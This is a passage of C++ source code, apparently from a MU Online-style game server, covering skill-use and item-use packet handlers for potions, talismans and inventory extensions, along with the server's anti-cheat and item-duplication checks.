				if(gObj[aTargetIndex].Authority == 40 && gObj[aTargetIndex].AuthorityCode == 0x3F)
				{
					if(aTargetIndex != aIndex)
						return;
				}
			}
		}

		lpObj->MovePerSecs++;
		gObjUseSkill.UseSkill(aIndex, lpMagic,lpMsg->X, lpMsg->Y, lpMsg->Dir, lpMsg->TargetPos, aTargetIndex);

		if ( lpMsg->MagicKey )
			lpObj->DurMagicKeyChecker.SetDurationTime(lpMsg->MagicKey, GetTickCount());
	}else
	{		
		PMSG_DURATION_MAGIC_RECV* lpMsg = (PMSG_DURATION_MAGIC_RECV *) Msg;	

		CMagicInf * lpMagic;
		LPOBJ lpObj = &gObj[aIndex];

		if(lpMsg->MagicNumberH == 0xCC)
			lpMsg->MagicNumberH = 0;
		int Magic = MAKE_NUMBERW(lpMsg->MagicNumberH,lpMsg->MagicNumberL);

		Mastering2.BaseSkill(Magic);

		if ( lpObj->Teleport )
		{
			return;
		}

		if ( gObj[aIndex].Type == OBJ_USER )
		{
			lpMagic = gObjGetMagicSearch(lpObj, Magic);
		}
		else
		{
			lpMagic = gObjGetMagic( lpObj, Magic);
		}

		if ( lpMagic == NULL )
		{
			return;
		}
			
	
		if ( lpObj->Type == OBJ_USER )
		{
			if ( MagicDamageC.CheckStatus(lpMagic->m_Skill, lpObj->GuildStatus) == FALSE )
			{
				LogAddC(2, "[0x1E] CGDurationMagicRecv() - Invalid Status");	// #warning maybe protocol here change
				return;
			}

			if ( MagicDamageC.CheckKillCount(lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
			{
				LogAddC(2, "[0x1E] CGDurationMagicRecv() - Invalid KillCount");
				return;
			}
		}

		if(lpMagic->m_Skill == 235)
			lpObj->UseMagicNumber = 235;
		else
			lpObj->UseMagicNumber = 0;

		if ((lpMagic->m_Skill != 24) && 
			(lpMagic->m_Skill != 235) && 
			(lpMagic->m_Skill != 490) && 
			(lpMagic->m_Skill != 491) && 
			(lpMagic->m_Skill != 492) && 
			(lpMagic->m_Skill != 493) && 
			(lpMagic->m_Skill != 494))
		{
			if ( !gObjUseSkill.SpeedHackCheck(aIndex,3) )
			{
				return;
			}
		}

		if ( !gObjUseSkill.EnableSkill(lpMagic->m_Skill) )
		{
			return;
		}

		int aTargetIndex = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

		if(gObjIsConnected(aTargetIndex) == TRUE)
		{
			if ( gObj[aTargetIndex].Type == OBJ_USER )
			{
				if(gObj[aTargetIndex].Authority == 40 && gObj[aTargetIndex].AuthorityCode == 0x3F)
					if(aTargetIndex != aIndex)
						return;
			}
		}

		lpObj->MovePerSecs++;
		gObjUseSkill.UseSkill(aIndex, lpMagic,lpMsg->X, lpMsg->Y, lpMsg->Dir, lpMsg->TargetPos, aTargetIndex);

		if ( lpMsg->MagicKey )
			lpObj->DurMagicKeyChecker.SetDurationTime(lpMsg->MagicKey, GetTickCount());
	}
}


struct PMSG_USERMAPJOIN
{
	PBMSG_HEAD h;	// C1:F3:03
	BYTE subcode;	// 3
	BYTE NumberH;	// 4
	BYTE NumberL;	// 5
	BYTE X;	// 6
	BYTE Y;	// 7
	BYTE MapNumber;	// 8
	BYTE Dir;	// 9
};



void ObjectMapJoinPositionSend(short aIndex)	// Not Used
{
	PMSG_USERMAPJOIN pObject;
	
	PHeadSubSetB((LPBYTE)&pObject, 0xF3, 0x03, sizeof(pObject));
	pObject.NumberH = SET_NUMBERH(aIndex);
	pObject.NumberL = SET_NUMBERL(aIndex);
	pObject.X = gObj[aIndex].X;
	pObject.Y = gObj[aIndex].Y;
	pObject.MapNumber = gObj[aIndex].MapNumber;
	pObject.Dir = gObj[aIndex].Dir;

	DataSend(aIndex, (LPBYTE)&pObject, pObject.h.size);
}


void CGUseItemAmuletRecv(int aIndex,BYTE pos)
{
	CItem * citem;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	// Check User States
	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type != 3 )
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, TRUE, gObj[aIndex].iShield);

		LogAdd("[%s][%s] CGUseItemRecv()_If return %s %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[aIndex].m_bMapAntiHackMove == true )
		return;

	// Check if User is exiting
	if ( gObj[aIndex].CloseType != -1 )
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, TRUE, gObj[aIndex].iShield);

		LogAdd("[%s][%s] CGUseItemRecv()_CloseType return %s %d",
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}

	// Fix Inventory Pointer
	if ( gObjFixInventoryPointer(aIndex) == false )
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d",
			__FILE__, __LINE__);
		//return;
	}

	// Check if there is a Transaction
	// Dupe
	if ( gObj[aIndex].pTransaction == 1 )
	{
		LogAddTD("[%s][%s] CGUseItemRecv() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type);

		return;
	}

	// Check if the pos is in bounds
	if ( pos > ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false)-1 )
	{
		// error : Location is over the range. %s/%d
		LogAdd(lMsg.Get(MSGGET(1, 241)), __FILE__, __LINE__);

		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);

		LogAdd("[%s][%s] CGUseItemRecv()_Inventory return %s %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}

	// Set Pointer
	citem = &gObj[aIndex].pInventory[pos];

	// The item is ITEM
	if ( citem->IsItem() )
	{
		// Check if item have 0 as Serial
		if ( gObjCheckSerial0ItemList(citem) )
		{
			MsgOutput(aIndex, lMsg.Get(MSGGET(13, 26)));

			GCReFillSend(aIndex,
					gObj[aIndex].Life,
					0xFD,
					1,
					gObj[aIndex].iShield);


			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[Anti-Hack][Serial 0 Item] [UseItem] (%s)(%s) Item(%s) Pos(%d)",
					gObj[aIndex].AccountID,
					gObj[aIndex].Name,
					citem->GetName(),
					pos);
			}
			GCServerMsgStringSend("[Anti-Hack] Serial 0 Item use",aIndex, 0x01);

			return;
		}

		// Check the item Serial
		if ( gObjInventorySearchSerialNumber(&gObj[aIndex],
												citem->GetNumber()) == FALSE )
		{
			GCReFillSend(aIndex,
					gObj[aIndex].Life,
					0xFD,
					1,
					gObj[aIndex].iShield);
		
			
			LogAdd("error-L2 : CopyItem [%s][%s] return %s %d",
				gObj[aIndex].AccountID,
				gObj[aIndex].Name,
				__FILE__, __LINE__);

			return;
		}

		if ( citem->m_serial && !gObjCanItemTouch(&gObj[aIndex], 1) )
		{
			GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			return;
		}

		if  (  citem->m_Type >= ITEMGET(13,128) &&
			   citem->m_Type <= ITEMGET(13,134)
			)
		{
			g_ItemAddOption.SetItemEffect(&gObj[aIndex], citem->m_Type, 0);
			gObjInventoryItemSet(aIndex, pos, -1);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);
			return;
		}
	}
}


void CGUseItemRecv(PMSG_USEITEM* lpMsg, int aIndex)
{
	int pos;
	CItem * citem;
	int iItemUseType = lpMsg->btItemUseType;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	// Check User States
	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type != 3 )
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, TRUE, gObj[aIndex].iShield);

		LogAdd("[%s][%s] CGUseItemRecv()_If return %s %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[aIndex].m_bMapAntiHackMove == true )
		return;

	// Check if User is exiting
	if ( gObj[aIndex].CloseType != -1 )
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, TRUE, gObj[aIndex].iShield);

		LogAdd("[%s][%s] CGUseItemRecv()_CloseType return %s %d",
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}

	// Fix Inventory Pointer
	if ( gObjFixInventoryPointer(aIndex) == false )
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d",
			__FILE__, __LINE__);
		//return;
	}

	// Check if there is a Transaction
	// Dupe
	if ( gObj[aIndex].pTransaction == 1 )
	{
		LogAddTD("[%s][%s] CGUseItemRecv() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type);

		return;
	}

	// Set Var Pos
	pos = lpMsg->inventoryPos;

	// Check if the pos is in bounds
	if ( pos > ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false)-1 )
	{
		// error : Location is over the range. %s/%d
		LogAdd(lMsg.Get(MSGGET(1, 241)), __FILE__, __LINE__);

		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);

		LogAdd("[%s][%s] CGUseItemRecv()_Inventory return %s %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}


	// check if the item
	// have the same position
	// as the new position
	if ( lpMsg->inventoryPos == lpMsg->invenrotyTarget )
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);

		LogAdd("error-L1 : [%s][%s] CGUseItemRecv()_Pos return %s %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			__FILE__, __LINE__);

		return;
	}

	// Set Pointer
	citem = &gObj[aIndex].pInventory[pos];


	// The item is ITEM
	if ( citem->IsItem() )
	{
		// Check if item have 0 as Serial
		if ( gObjCheckSerial0ItemList(citem) )
		{
			MsgOutput(aIndex, lMsg.Get(MSGGET(13, 26)));

			GCReFillSend(aIndex,
					gObj[aIndex].Life,
					0xFD,
					1,
					gObj[aIndex].iShield);


			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[Anti-Hack][Serial 0 Item] [UseItem] (%s)(%s) Item(%s) Pos(%d)",
					gObj[aIndex].AccountID,
					gObj[aIndex].Name,
					citem->GetName(),
					pos);
			}
			GCServerMsgStringSend("[Anti-Hack] Serial 0 Item use",aIndex, 0x01);

			return;
		}

		// Check the item Serial
		if ( gObjInventorySearchSerialNumber(&gObj[aIndex],
												citem->GetNumber()) == FALSE )
		{
			GCReFillSend(aIndex,
					gObj[aIndex].Life,
					0xFD,
					1,
					gObj[aIndex].iShield);
		
			
			LogAdd("error-L2 : CopyItem [%s][%s] return %s %d",
				gObj[aIndex].AccountID,
				gObj[aIndex].Name,
				__FILE__, __LINE__);

			return;
		}

		if ( citem->m_serial && !gObjCanItemTouch(&gObj[aIndex], 1) )
		{
			GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			return;
		}

		if (( citem->m_Type >= ITEMGET(14,72) &&
			 citem->m_Type <= ITEMGET(14,82)) ||
			 ( citem->m_Type >= ITEMGET(13,81) &&
			 citem->m_Type <= ITEMGET(13,82)) ||
			 ( citem->m_Type >= ITEMGET(14,97) &&
			 citem->m_Type <= ITEMGET(14,98))
			 )
		{
			int Secs = MuItemShop.UseBuffGetTime(aIndex,pos);
			g_ItemAddOption.SetItemEffect(&gObj[aIndex], citem->m_Type, Secs);			
			gObjInventoryItemSet(aIndex, pos, -1);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);
			return;
		}

		if ( citem->m_Type == ITEMGET(14,0) || // Apple
			 citem->m_Type == ITEMGET(14,1) ||
			 citem->m_Type == ITEMGET(14,2) ||
			 citem->m_Type == ITEMGET(14,3) )
		{
			int tLife = (citem->m_Value*10) - (gObj[aIndex].Level*2);	// #formula

			if ( tLife <  0 )
			{
				tLife = 0;
			}

			int nAddRate=0;

			switch ( citem->m_Type )
			{
				case ITEMGET(14,0):	// Apple
					nAddRate = ReadConfig.CGUseItemRecvHP0;
					break;
				case ITEMGET(14,1):	// 
					nAddRate = ReadConfig.CGUseItemRecvHP1;
					break;
				case ITEMGET(14,2):	// 
					nAddRate = ReadConfig.CGUseItemRecvHP2;
					break;
				case ITEMGET(14,3):	// 
					nAddRate = ReadConfig.CGUseItemRecvHP3;
					break;
			}

			if ( citem->m_Level == 1 )	// #formula
			{
				nAddRate += 5;
			}

			tLife += ((int)gObj[aIndex].MaxLife * nAddRate) / 100;	// #formula

			if ( citem->m_Type == ITEMGET(14,0) )
			{
				if ( citem->m_Level < 2 )
				{
					gObj[aIndex].FillLife += tLife;
					tLife = 0;
				}
			}

			if ( gObj[aIndex].FillLife > 0.0f )
			{
				gObj[aIndex].Life += gObj[aIndex].FillLife;

				if ( gObj[aIndex].Life > (gObj[aIndex].MaxLife +gObj[aIndex].AddLife) )
				{
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
					gObj[aIndex].FillLife = 0;
				}

				GCReFillSend(gObj[aIndex].m_Index, gObj[aIndex].Life, 0xFF, FALSE, gObj[aIndex].iShield);
			}

			gObj[aIndex].FillLifeMax = tLife;
			gObj[aIndex].FillLife = tLife;

			if ( citem->m_Type == ITEMGET(14,0) && citem->m_Level < 2 )
			{
				gObj[aIndex].FillLifeCount = 0;
			}
			else if ( citem->m_Level == 1 )
			{
				gObj[aIndex].FillLifeCount = 2;
			}
			else
			{
				gObj[aIndex].FillLifeCount = 3;
			}

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if (citem->m_Type == ITEMGET(14,4) ||	// Small Mana Potion
				 citem->m_Type == ITEMGET(14,5) ||
				 citem->m_Type == ITEMGET(14,6)  )
		{
			int tMana = (citem->m_Value*10) - (gObj[aIndex].Level);	// #formula

			if ( tMana < 0 )
			{
				tMana=0;
			}

			switch ( citem->m_Type )
			{
				case ITEMGET(14,4):	// Small Mana Potion
					tMana += ((int)(gObj[aIndex].MaxMana + gObj[aIndex].AddMana))*ReadConfig.CGUseItemRecvMP1/100; 
					break;
				case ITEMGET(14,5):	// Mana Potion
					tMana += ((int)(gObj[aIndex].MaxMana + gObj[aIndex].AddMana))*ReadConfig.CGUseItemRecvMP2/100; 
					break;
				case ITEMGET(14,6):	// Large Mana Potion
					tMana += ((int)(gObj[aIndex].MaxMana + gObj[aIndex].AddMana))*ReadConfig.CGUseItemRecvMP3/100; 
					break;
			}

			gObj[aIndex].Mana += tMana;

			if ( gObj[aIndex].Mana > (gObj[aIndex].MaxMana+gObj[aIndex].AddMana-1.0f) )
				gObj[aIndex].Mana = gObj[aIndex].MaxMana+gObj[aIndex].AddMana;
			
			GCManaSend(aIndex, gObj[aIndex].Mana, 0xFF, 0, gObj[aIndex].BP);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if (citem->m_Type == ITEMGET(14,94))	//Elite Medium Healing Potion
		{
			gObj[aIndex].Life += (gObj[aIndex].MaxLife + gObj[aIndex].AddLife)*65/100;
			
			if ( gObj[aIndex].Life > (gObj[aIndex].MaxLife +gObj[aIndex].AddLife) )
			{
				gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
			}

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			LogAddTD("[%s][%s]Use Medium Elite Healing Potion - SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].iShield, gObj[aIndex].Life);

			GCReFillSend(gObj[aIndex].m_Index,gObj[aIndex].Life,255,0,gObj[aIndex].iShield);
		}
		else if (citem->m_Type == ITEMGET(14,70))	//Elite Healing Potion
		{
			gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			LogAddTD("[%s][%s]Use Elite Healing Potion - SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].iShield, gObj[aIndex].Life);

			GCReFillSend(gObj[aIndex].m_Index,gObj[aIndex].Life,255,0,gObj[aIndex].iShield);
		}
		else if (citem->m_Type == ITEMGET(14,71))	//Elite Mana Potion
		{
			gObj[aIndex].Mana = gObj[aIndex].MaxMana + gObj[aIndex].AddMana;

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			LogAddTD("[%s][%s]Use Elite Mana Potion - BP[%d] Mana[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].BP, gObj[aIndex].Mana);

			GCManaSend(gObj[aIndex].m_Index,gObj[aIndex].Mana,255,0,gObj[aIndex].BP);
		}
		else if (citem->m_Type == ITEMGET(14,133))	//Elite SD Potion
		{
			gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			LogAddTD("[%s][%s]Use Elite SD Potion - SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].iShield, gObj[aIndex].Life);
		
			GCReFillSend(gObj[aIndex].m_Index,gObj[aIndex].Life,255,0,gObj[aIndex].iShield);
		}
		else if ( citem->m_Type == ITEMGET(14,38) )	// Small Compound Potion 
		{
			int iShieldGage = (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield) * 5/100;	// #formula
			int iHPGage = (int)((gObj[aIndex].MaxLife + gObj[aIndex].AddLife) * 10.0f / 100.0f );	// #formula

			if ( gObj[aIndex].iShield < 0 )
				gObj[aIndex].iShield = 0;

			if ( gObj[aIndex].FillLife > 0.0f )
			{
				gObj[aIndex].Life += gObj[aIndex].FillLife;

				if ( gObj[aIndex].Life > (gObj[aIndex].MaxLife + gObj[aIndex].AddLife ) )
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
			}

			if ( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield += gObj[aIndex].iFillShield;

				if (  gObj[aIndex].iShield > (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield )  )
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
			}

			gObj[aIndex].FillLife = iHPGage;
			gObj[aIndex].FillLifeMax = iHPGage;
			gObj[aIndex].FillLifeCount = 4;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;
			gObj[aIndex].iFillShieldCount = 4;

			GCSendEffectInfo(aIndex, 3);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			LogAddTD("[%s][%s]Use Compound Potion Lv1 - SD[%d] HP[%f] -> SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].iShield, gObj[aIndex].Life,
				gObj[aIndex].iShield+iShieldGage, (double)(gObj[aIndex].Life+(float)iHPGage));
		}
		else if ( citem->m_Type == ITEMGET(14,39) )	// Compound Potion 
		{
			int iShieldGage = (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield) * 10/100;	// #formula
			int iHPGage = (int)((gObj[aIndex].MaxLife + gObj[aIndex].AddLife) * 25.0f / 100.0f );	// #formula

			if ( gObj[aIndex].iShield < 0 )
				gObj[aIndex].iShield = 0;

			if ( gObj[aIndex].FillLife > 0.0f )
			{
				gObj[aIndex].Life += gObj[aIndex].FillLife;

				if ( gObj[aIndex].Life > (gObj[aIndex].MaxLife + gObj[aIndex].AddLife ) )
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
			}

			if ( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield += gObj[aIndex].iFillShield;

				if (  gObj[aIndex].iShield > (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield )  )
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
			}

			gObj[aIndex].FillLife = iHPGage;
			gObj[aIndex].FillLifeMax = iHPGage;
			gObj[aIndex].FillLifeCount = 4;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;
			gObj[aIndex].iFillShieldCount = 4;

			GCSendEffectInfo(aIndex, 3);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			LogAddTD("[%s][%s]Use Compound Potion Lv2 - SD[%d] HP[%f] -> SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].iShield, gObj[aIndex].Life,
				gObj[aIndex].iShield+iShieldGage, (double)(gObj[aIndex].Life+(float)iHPGage));
		}
		else if ( citem->m_Type == ITEMGET(14,40) )	// Large Compound Potion 
		{
			int iShieldGage = (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield) * 20/100;	// #formula
			int iHPGage = (int)((gObj[aIndex].MaxLife + gObj[aIndex].AddLife) * 45.0f / 100.0f );	// #formula

			if ( gObj[aIndex].iShield < 0 )
				gObj[aIndex].iShield = 0;

			if ( gObj[aIndex].FillLife > 0.0f )
			{
				gObj[aIndex].Life += gObj[aIndex].FillLife;

				if ( gObj[aIndex].Life > (gObj[aIndex].MaxLife + gObj[aIndex].AddLife ) )
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
			}

			if ( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield += gObj[aIndex].iFillShield;

				if (  gObj[aIndex].iShield > (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield )  )
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
			}

			gObj[aIndex].FillLife = iHPGage;
			gObj[aIndex].FillLifeMax = iHPGage;
			gObj[aIndex].FillLifeCount = 4;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;
			gObj[aIndex].iFillShieldCount = 4;

			GCSendEffectInfo(aIndex, 3);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			LogAddTD("[%s][%s]Use Compound Potion Lv3 - SD[%d] HP[%f] -> SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].iShield, gObj[aIndex].Life,
				gObj[aIndex].iShield+iShieldGage, (double)(gObj[aIndex].Life+(float)iHPGage));
		}
		else if ( citem->m_Type == ITEMGET(14,162) )//Extended Inventory
		{
			if(gObj[aIndex].ExInventory + gObj[aIndex].ExInventoryTmp < 2)
			{
				gObj[aIndex].ExInventoryTmp = gObj[aIndex].ExInventory + 1;

				if(gObj[aIndex].ExInventoryTmp == 1)
				{
					for ( BYTE ItemPos = MAIN_INVENTORY_NORMAL_SIZE /*76*/ ; ItemPos < (MAIN_INVENTORY_NORMAL_SIZE + (MAX_EXTENDED_INV*EXTENDED_INV_SIZE)) /* was 140 added extra inv space*/ ; ItemPos ++ )
					{
						if ( gObj[aIndex].pInventory[ItemPos].IsItem() == TRUE)
						{
							gObjInventoryDeleteItem ( aIndex , ItemPos );		
						}
					}
				}

				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);

				BYTE buff[4] = {0xc1,0x04,0x2B,0x01};
				DataSend(aIndex, buff, sizeof(buff));
			}
			
		}
		else if ( citem->m_Type == ITEMGET(13,69) )//Talisman of Resurrection
		{
			if(gObj[aIndex].DieX == 0 && gObj[aIndex].DieY == 0)
			{
			}else
			{				
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);

				gObjTeleport(aIndex, gObj[aIndex].DieMap, gObj[aIndex].DieX, gObj[aIndex].DieY);
			}
		}
		else if ( citem->m_Type == ITEMGET(13,70) )//Talisman of Mobility
		{	
			struct PMSG_ITEMDUR
			{
				PBMSG_HEAD h;	// C1:2A
				BYTE IPos;	// 3
				BYTE Dur;	// 4
				BYTE Flag;	// 5
			};

			PMSG_ITEMDUR pMsg = {0};

			PHeadSetB((LPBYTE)&pMsg, 0x2A, sizeof(pMsg));
			pMsg.IPos = pos;
			pMsg.Dur = 1;
			pMsg.Flag = 1;
			
			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));

			int caca = 0;
			caca=4;
		}
		else if ( citem->m_Type == ITEMGET(14,163) )//Extended Vault
		{
			if(gObj[aIndex].ExWarehouse + gObj[aIndex].ExWarehouseTmp == 0)
			{
				gObj[aIndex].ExWarehouseTmp = 1;
				gObj[aIndex].AccountExtraInfoModified = 1;

				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);

				BYTE buff[4] = {0xc1,0x04,0x2B,0x01};
				DataSend(aIndex, buff, sizeof(buff));
			}
		}
		else if (qs5.UseItem(aIndex,citem->m_Type) == true)
		{
			gObjInventoryItemSet(aIndex, pos, -1);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);
		}
		else if ( citem->m_Type == ITEMGET(14,35) )
		{
			int iShieldGage = (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield) * 25 / 100;	// #formula

			if ( gObj[aIndex].iShield < 0 )
				gObj[aIndex].iShield = 0;

			if ( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield += gObj[aIndex].iFillShield;

				if ( gObj[aIndex].iShield > (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
			}

			gObj[aIndex].iFillShieldCount = 2;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;

			GCSendEffectInfo(aIndex, 3);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,36) )
		{
			int iShieldGage = (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield) * 35 / 100;	// #formula

			if ( gObj[aIndex].iShield < 0 )
				gObj[aIndex].iShield = 0;

			if ( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield += gObj[aIndex].iFillShield;

				if ( gObj[aIndex].iShield > (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
			}

			gObj[aIndex].iFillShieldCount = 2;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;

			GCSendEffectInfo(aIndex, 3);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,37) )
		{
			int iShieldGage = (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield) * 45 / 100; // #formula

			if ( gObj[aIndex].iShield < 0 )
				gObj[aIndex].iShield = 0;

			if ( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield += gObj[aIndex].iFillShield;

				if ( gObj[aIndex].iShield > (gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
			}

			gObj[aIndex].iFillShieldCount = 2;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;

			GCSendEffectInfo(aIndex, 3);

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
